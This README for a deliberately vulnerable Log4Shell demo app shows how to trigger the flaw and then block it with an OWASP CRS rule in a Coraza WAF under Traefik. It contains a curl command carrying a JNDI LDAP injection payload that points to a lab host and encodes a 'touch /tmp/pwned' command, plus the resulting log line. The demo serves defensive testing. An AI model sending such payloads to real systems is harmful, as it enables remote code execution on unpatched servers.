# log4shell vulnerable app

This example includes a log4shell vulnerable deployment.

## Getting started

Deploy the vulnerable app

```console
make deploy
```

Perform malicious requests:

```console
curl -i http://localhost -H 'X-Api-Version: ${jndi:ldap://vulapp:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

The log4shell vulnerable app will evidence there was an attempt to connect to a provided address:

```console
2024-03-12 01:02:10,826 http-nio-8080-exec-2 WARN Error looking up JNDI resource [ldap://localhost:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: localhost:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
```

We can enable protection for such attacks by enabling CRS rule 932130 to look into `REQUEST_HEADERS`:

```console
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: config
  namespace: traefik
data:
  config.yaml: |
    http:
      middlewares:
        waf:
          plugin:
            coraza:
              directives:
                - Include @recommended-conf
                - Include @crs-setup-conf
                - Include @owasp_crs/*.conf
                - SecRuleUpdateTargetById 932130 "REQUEST_HEADERS"
                - SecRuleEngine On
EOF
```
